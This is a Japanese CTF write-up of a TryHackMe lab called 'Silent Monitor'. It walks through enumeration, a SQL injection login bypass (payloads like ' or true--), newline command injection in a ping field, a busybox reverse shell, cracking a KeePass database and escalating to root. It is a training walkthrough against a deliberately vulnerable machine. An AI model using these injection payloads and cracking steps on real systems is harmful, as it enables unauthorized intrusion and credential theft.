# Silent Monitor CTF

https://tryhackme.com/room/silent-monitor

## Enumeration

```shell
TARGET=10.144.135.34
sudo bash -c "echo $TARGET   silent.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5050/tcp open  mmcc    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,5050 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

5050はHTTPだった。

```sh
root@ip-10-144-81-10:~# nikto -p 5050 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.144.135.34
+ Target Hostname:    silent.thm
+ Target Port:        5050
+ Start Time:         2026-07-08 04:47:04 (GMT0)
---------------------------------------------------------------------------
+ Server: Werkzeug/2.0.2 Python/3.10.12
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, OPTIONS 
+ 1707 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2026-07-08 04:47:09 (GMT0) (5 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## HTTP

フッターに下記バージョンが出ているが、脆弱性情報などは見つからなかった。

```txt
NOC Portal v2.4.1
```

### ディレクトリ列挙

/internal を発見。ログイン画面が表示された。admin /admin ではログインできなかった。

```sh
root@ip-10-144-81-10:~# dirb http://$TARGET:5050/

---- Scanning URL: http://10.144.135.34:5050/ ----
+ http://10.144.135.34:5050/internal (CODE:200|SIZE:8770)

-----------------
END_TIME: Wed Jul  8 04:56:37 2026
DOWNLOADED: 4612 - FOUND: 1
```

admin & fasttrack のブルートフォースは失敗。

```sh
$ hydra $TARGET http-post-form "/internal:username=^USER^&password=^PASS^:Invalid username or password." -l admin -P /usr/share/wordlists/fasttrack.txt -t 30 -s 5050
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-08 01:09:42
[DATA] max 30 tasks per 1 server, overall 30 tasks, 262 login tries (l:1/p:262), ~9 tries per task
[DATA] attacking http-post-form://10.144.132.187:5050/internal:username=^USER^&password=^PASS^:Invalid username or password.
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-08 01:09:50
```

/internal の下に、/dashboard, /health, /logout を発見したが認証が必要。

```shell
root@ip-10-144-81-10:~# gobuster dir -q -x=php,php.bak -u http://$TARGET:5050/internal/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 64 -k
/dashboard            (Status: 302) [Size: 224] [--> http://10.144.132.187:5050/internal]
/health               (Status: 302) [Size: 224] [--> http://10.144.132.187:5050/internal]
/logout               (Status: 302) [Size: 224]
```

ユーザー名に[認証バイパスのペイロード](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/Auth_Bypass.txt)を試したら複数のペイロードで認証をすり抜けた。

```sh
$ hydra $TARGET http-post-form "/internal:username=^USER^&password=^PASS^:Invalid username or password." -L auth_bypass.txt -p pass -t 30 -s 5050
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-08 01:29:49
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 78 login tries (l:78/p:1), ~3 tries per task
[DATA] attacking http-post-form://10.144.132.187:5050/internal:username=^USER^&password=^PASS^:Invalid username or password.
[5050][http-post-form] host: 10.144.132.187   login: ' or true--   password: pass
[5050][http-post-form] host: 10.144.132.187   login: admin' or '1'='1'--   password: pass
[5050][http-post-form] host: 10.144.132.187   login: admin'or 1=1 or ''='   password: pass
[5050][http-post-form] host: 10.144.132.187   login: admin' or '1'='1'/*   password: pass
[5050][http-post-form] host: 10.144.132.187   login: admin' or 1=1--   password: pass
[5050][http-post-form] host: 10.144.132.187   login: admin' or 1=1/*   password: pass
1 of 1 target successfully completed, 6 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-08 01:30:03
```

ユーザー名を `' or true--` としてダッシュボード表示成功。

## /health

監査ログの表示を参考に、下記の形でコマンド実行に成功した。

```sh
target=127.0.0.1 %0A id
```

```html
<pre class="output-pre">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1051ms
rtt min/avg/max/mdev = 0.015/0.027/0.039/0.012 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

この形を使い、busyboxでリバースシェル取得成功。

## 権限昇格１

sysadmin に昇格が必要。

```sh
www-data@tryhackme-2204:/opt/netops$ ls -al /home
total 16
drwxr-xr-x  4 root     root     4096 May 19 03:10 .
drwxr-xr-x 19 root     root     4096 Jul  8 05:02 ..
drwxr-x---  5 sysadmin sysadmin 4096 May 19 03:35 sysadmin
drwxr-xr-x  4 ubuntu   ubuntu   4096 May 19 03:40 ubuntu
```

Webアプリケーション。

```sh
www-data@tryhackme-2204:/opt/netops$ ls -al
total 44
drwxrwx--- 3 root     www-data  4096 Jul  8 05:02 .
drwxr-xr-x 3 root     root      4096 May 19 03:10 ..
-rw-r--r-- 1 root     root      7283 May 19 19:14 app.py
-rw-rw---- 1 www-data www-data 20480 Jul  8 05:02 netops.db
-rw-r----- 1 root     www-data   446 May 19 03:10 secret.config
drwxr-x--- 2 root     www-data  4096 May 19 03:10 templates
```

```sh
www-data@tryhackme-2204:/opt/netops$ cat secret.config
# netops application config
# generated: 2026-01-03

[database]
path    = /opt/netops/netops.db
timeout = 5

[app]
host     = 0.0.0.0
port     = 5050
log_path = /var/log/netops/app.log

[auth]
session_lifetime = 1800

# service account used by the backup agent
# TODO: migrate to secrets manager before Q2 audit
[backup_agent]
run_as   = sysadmin
password = [REDACTED]

[smtp]
host = 127.0.0.1
port = 25
from = noc-alerts@corp.internal
```

- secret.config 内でパスワードを見つけたが、su は失敗した。
- app.py 内にもパスワードが出ていたが、それも su 失敗した。
- dbファイル内に netopsユーザーのMD5ハッシュがあったが、クラックはできなかった。

secret.config のパスワードに注目し、Backupの部分が他の単語に置き換わったパスワードを使えるのではないかという気はする。  
Backupの部分を単語リストに当てはめてsuをブルートフォースするスクリプトを動かしたがうまくいかなかった。

結局、このパスワードのままでSSH接続ができた。盲点・・・

## 権限昇格２

backupsディレクトリがある。認証情報が入っているらしい。

```sh
sysadmin@tryhackme-2204:~$ ls -al backups
total 16
drwx------ 2 sysadmin sysadmin 4096 May 19 03:36 .
drwxr-x--- 5 sysadmin sysadmin 4096 May 19 03:35 ..
-rw-r--r-- 1 sysadmin sysadmin  286 May 19 03:36 README.txt
-rw------- 1 sysadmin sysadmin 2439 May 19 03:34 infrastructure.kdbx
```

```sh
sysadmin@tryhackme-2204:~$ cat backups/README.txt 
Backup archive — infrastructure credentials

Periodic exports from the credential store are placed here by the backup agent.
Treat all files in this directory as CONFIDENTIAL.

infrastructure.kdbx — KeePass credential database

Contact the sysadmin team lead if you require access.
```

入手した２つのパスワードでは開けなかった。

```sh
$ keepassxc-cli open ./infrastructure.kdbx 
Enter password to unlock ./infrastructure.kdbx: 
Error while reading the database: Invalid credentials were provided, please try again.
If this reoccurs, then your database file may be corrupt. (HMAC mismatch)
```

rockyou.txt でクラックできた。

https://github.com/openwall/john/issues/5775#issuecomment-4608332227

```sh
$ snap run john-the-ripper hash --wordlist=rockyou.txt --format=KeePass                   
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 128/128 SSE2])
Cost 1 (t (rounds)) is 15000 for all loaded hashes
Cost 2 (m) is 0 for all loaded hashes
Cost 3 (p) is 0 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
Will run 4 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
[REDACTED]           (infrastructure)     
1g 0:00:00:00 DONE (2026-07-08 03:47) 4.545g/s 11490p/s 11490c/s 11490C/s spring..canela
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

rootユーザーのパスワードが入っていた。

```sh
$ keepassxc-cli open ./infrastructure.kdbx 
Enter password to unlock ./infrastructure.kdbx: 

backup> ls
Root User Password - Sensitive
General/
Windows/
Network/
Internet/
eMail/
Homebanking/
Recycle Bin/

backup> show -s "Root User Password - Sensitive"
Title: Root User Password - Sensitive
UserName: root
Password: [REDACTED]
URL: https://keepass.info/
Notes: root user password, remember to change later.
Uuid: {ab5192bf-d112-1141-853c-3c99d69d5cae}
Tags: 
```

パスワードを使って昇格成功。

```sh
sysadmin@tryhackme-2204:~$ su -
Password: 
root@tryhackme-2204:~# 
```

## 振り返り

- 今回、sqlmap では比較的単純なSQLインジェクションの脆弱性を検出できなかった。下記のオプションを付けたら検出できることを確認した。
- su が失敗してもパスワードが間違っているとは限らず、SSH接続が成功する場合があることは良い学びだった。
- keepass のクラックで安定的かつ素早く実行できる方法を学べたのが良かった。

```sh
$ sqlmap -r ./login.txt --level=5 --risk=3 --technique=B --not-string="Invalid username or password." --dbs --batch
        ___
       __H__                                                                                                       
 ___ ___[)]_____ ___ ___  {1.9.2#stable}                                                                           
|_ -| . [)]     | .'| . |                                                                                          
|___|_  [']_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:13:42 /2026-07-08/

[04:13:42] [INFO] parsing HTTP request from './login.txt'
[04:13:42] [INFO] testing connection to the target URL
[04:13:43] [INFO] testing if POST parameter 'username' is dynamic
[04:13:43] [INFO] POST parameter 'username' appears to be dynamic
[04:13:43] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[04:13:43] [INFO] testing for SQL injection on POST parameter 'username'
[04:13:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:14:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
got a 302 redirect to 'http://silent.thm:5050/internal/dashboard'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[04:14:04] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
[04:14:09] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[04:14:09] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[04:14:09] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 163 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4643' OR 1774=1774-- YjRA&password=admin
---
[04:14:17] [INFO] testing SQLite
[04:14:17] [INFO] confirming SQLite
[04:14:18] [INFO] actively fingerprinting SQLite
[04:14:18] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[04:14:18] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[04:14:18] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/silent.thm'
[04:14:18] [WARNING] your sqlmap version is outdated

[*] ending @ 04:14:18 /2026-07-08/
```

## Tags

#tags:SQLインジェクション #tags:keepass
